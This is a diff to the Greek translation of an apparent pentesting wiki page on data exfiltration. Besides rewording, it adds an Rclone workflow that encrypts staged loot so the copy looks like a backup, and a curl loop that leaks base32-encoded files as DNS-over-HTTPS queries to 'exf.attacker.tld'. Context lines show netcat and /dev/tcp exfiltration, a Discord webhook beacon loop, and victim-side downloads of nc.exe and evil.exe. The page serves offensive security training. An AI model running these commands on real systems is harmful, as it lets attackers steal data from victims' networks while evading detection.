@@ -3,7 +3,7 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Για ένα end-to-end παράδειγμα staging loot στο `C:\Users\Public` και exfiltrating το με Rclone ώστε να μιμείται νόμιμα backups, δες το workflow παρακάτω.
+> Για ένα end-to-end παράδειγμα του staging loot στο `C:\Users\Public` και του exfiltrating του με το Rclone ώστε να μιμείται legitimate backups, δες το workflow παρακάτω.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
@@ -11,7 +11,7 @@
 
 ## Commonly whitelisted domains to exfiltrate information
 
-Δες [https://lots-project.com/](https://lots-project.com/) για να βρεις commonly whitelisted domains που μπορούν να abused
+Έλεγξε [https://lots-project.com/](https://lots-project.com/) για να βρεις commonly whitelisted domains που μπορούν να abused
 
 ## Copy\&Paste Base64
 
@@ -49,7 +49,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Upload files
+### Μεταφόρτωση αρχείων
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -109,9 +109,9 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) είναι ένα single-binary αντικατάσταση για το `python3 -m http.server`
+[goshs](https://github.com/patrickhener/goshs) είναι ένα single-binary αντικατάστατο για `python3 -m http.server`
 με upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
-και OOB συνεργατικές δυνατότητες (DNS, SMTP, NTLM hash capture).
+και λειτουργίες OOB συνεργασίας (DNS, SMTP, NTLM hash capture).
 ```bash
 # Serve current directory on port 8000
 goshs
@@ -142,9 +142,9 @@ goshs -tunnel
 ```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Τα Webhooks είναι write-only HTTPS endpoints που δέχονται JSON και προαιρετικά file parts. Συνήθως επιτρέπονται προς trusted SaaS domains και δεν απαιτούν OAuth/API keys, κάτι που τα κάνει χρήσιμα για low-friction beaconing και exfiltration.
+Τα Webhooks είναι write-only HTTPS endpoints που δέχονται JSON και προαιρετικά file parts. Συνήθως επιτρέπονται σε trusted SaaS domains και δεν απαιτούν OAuth/API keys, καθιστώντας τα χρήσιμα για low-friction beaconing και exfiltration.
 
-Κύριες ιδέες:
+Key ideas:
 - Endpoint: Discord χρησιμοποιεί https://discord.com/api/webhooks/<id>/<token>
 - POST multipart/form-data με ένα part με όνομα payload_json που περιέχει {"content":"..."} και προαιρετικό file part(s) με όνομα file.
 - Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK επιβεβαιώνουν την παράδοση.
@@ -217,13 +217,40 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-Σημειώσεις:
-- Παρόμοια patterns εφαρμόζονται και σε άλλες collaboration platforms (Slack/Teams) χρησιμοποιώντας τα incoming webhooks τους· προσαρμόστε το URL και το JSON schema ανάλογα.
+Notes:
+- Παρόμοια patterns ισχύουν και για άλλες collaboration platforms (Slack/Teams) χρησιμοποιώντας τα incoming webhooks τους· προσαρμόστε το URL και το JSON schema αναλόγως.
 - Για DFIR of Discord Desktop cache artifacts και webhook/API recovery, δείτε:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
+
+## Rclone (cloud/object-storage exfiltration)
+
+Modern operators συχνά **stage loot locally** και μετά χρησιμοποιούν [Rclone](https://rclone.org/) για να κάνουν τη μεταφορά να μοιάζει με ένα κανονικό backup ή sync job. Ένα πρακτικό pattern είναι:
+
+1. Ένα normal remote (`s3`, `webdav`, `drive`, `mega`, ...)
+2. Ένα `crypt` wrapper ώστε **contents and filenames are encrypted client-side**
+3. Ένα optional `chunker` wrapper αν ο provider επιβάλλει object-size limits ή αν θέλετε μικρότερα upload units
+```bash
+# 1) Create the storage backend remote (interactive)
+rclone config              # ex: remote
+
+# 2) Wrap it with client-side encryption
+rclone config              # ex: secret -> remote:path
+
+# 3) Optional: create a chunker overlay for large objects
+rclone config              # ex: overlay -> secret:
+
+# 4) Upload staged data
+rclone copy /loot secret:$(hostname)-$(date +%F) \
+--transfers 2 --checkers 2 --bwlimit 4M
+# If you created the chunker wrapper, upload to overlay:... instead
+```
+Σημειώσεις:
+- `crypt` μπορεί να κρυπτογραφήσει τόσο τα περιεχόμενα των αρχείων όσο και τα ονόματά τους.
+- Το `chunker` χωρίζει διαφανώς μεγάλα αρχεία και τα επανασυναρμολογεί κατά το download.
+- Το `rclone.conf` αποθηκεύει τα `crypt` secrets σε **obscured** μορφή, όχι ως ισχυρή προστασία at-rest. Για βραχύβιες λειτουργίες, προτίμησε ένα dedicated temporary config και αφαίρεσέ το afterward.
 
 ## FTP
 
@@ -268,7 +295,7 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali ως server
+Kali as server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
@@ -334,7 +361,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Ανέβασμα αρχείου στο θύμα
+### Ανέβασε αρχείο στο θύμα
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -361,15 +388,32 @@ print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
 ```
+## DNS over HTTPS (DoH)
+
+Αν το κλασικό UDP/53 DNS είναι θορυβώδες ή μπλοκαρισμένο, αλλά το εξερχόμενο HTTPS επιτρέπεται ευρέως, το συνηθισμένο μοτίβο exfiltration μέσω DNS labels μπορεί να τυλιχτεί μέσα σε αιτήματα **DoH** προς έναν δημόσιο resolver. Κράτα κάθε label πολύ κάτω από το όριο των 63 bytes του DNS και χρησιμοποίησε ένα DNS-safe alphabet όπως το Base32.
+```bash
+# Encode -> split into DNS-safe labels -> send via DoH
+base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
+nl -nrz -w4 -s. | while read chunk; do
+curl --http2 -s \
+-H 'accept: application/dns-json' \
+"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
+>/dev/null
+done
+```
+Στον authoritative DNS server για το `exf.attacker.tld`, ταξινομήστε τα queries με βάση το numeric prefix και ανακατασκευάστε το Base32 stream. Αυτό κρατά τη μεταφορά μέσα στο HTTPS προς τον resolver αντί για το κλασικό UDP/53 DNS.
+
+Για πλήρες bidirectional DNS tunnel tooling (`iodine`, `dnscat2`, etc.), δείτε [the tunneling page](tunneling-and-port-forwarding.md).
+
 ## **SMTP**
 
-Αν μπορείς να στείλεις δεδομένα σε έναν SMTP server, μπορείς να δημιουργήσεις έναν SMTP για να λάβεις τα δεδομένα με python:
+Αν μπορείτε να στείλετε data σε έναν SMTP server, μπορείτε να δημιουργήσετε ένα SMTP για να λάβει τα data με python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ### goshs
 
-Το [goshs](https://github.com/patrickhener/goshs) μπορεί να στήσει γρήγορα έναν SMTP server
+[goshs](https://github.com/patrickhener/goshs) μπορεί να στήσει γρήγορα έναν SMTP server
 για να πιάσει email callbacks κατά τη διάρκεια OOB exfiltration scenarios:
 ```bash
 # Start SMTP callback server
@@ -383,27 +427,27 @@ goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
-Από προεπιλογή στα XP και 2003 (σε άλλα χρειάζεται να προστεθεί ρητά κατά την εγκατάσταση)
+Από προεπιλογή σε XP και 2003 (σε άλλα χρειάζεται να προστεθεί ρητά κατά την εγκατάσταση)
 
-Στο Kali, **start TFTP server**:
+Στο Kali, **ξεκινήστε τον TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP server in python:**
+**TFTP server σε python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Στο **victim**, συνδεθείτε στον διακομιστή Kali:
+Στο **victim**, συνδεθείτε στον Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Κατεβάστε ένα αρχείο με ένα PHP oneliner:
+Κατέβασε ένα αρχείο με ένα PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -445,23 +489,20 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση binaries, αλλά έχει επίσης τη **δυνατότητα να τα ανακατασκευάζει από hex**. Αυτό σημαίνει ότι, δίνοντας ένα hex ενός binary, το `debug.exe` μπορεί να δημιουργήσει το binary file. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει έναν **περιορισμό στη συναρμολόγηση αρχείων έως 64 kb σε μέγεθος**.
+Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση binaries αλλά έχει επίσης τη **δυνατότητα να τα ανακατασκευάζει από hex**. Αυτό σημαίνει ότι, παρέχοντας ένα hex ενός binary, το `debug.exe` μπορεί να δημιουργήσει το binary file. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει έναν **περιορισμό στη συναρμολόγηση αρχείων έως 64 kb σε μέγεθος**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Κάνε τότε copy-paste το κείμενο στο windows-shell και θα δημιουργηθεί ένα αρχείο που ονομάζεται nc.exe.
-
-- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-
-## DNS
-
-- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
-- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
+Στη συνέχεια, κάνε copy-paste το κείμενο στο windows-shell και θα δημιουργηθεί ένα αρχείο που ονομάζεται nc.exe.
 
 ## References
 
+- [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
+- [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [goshs](https://github.com/patrickhener/goshs)
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
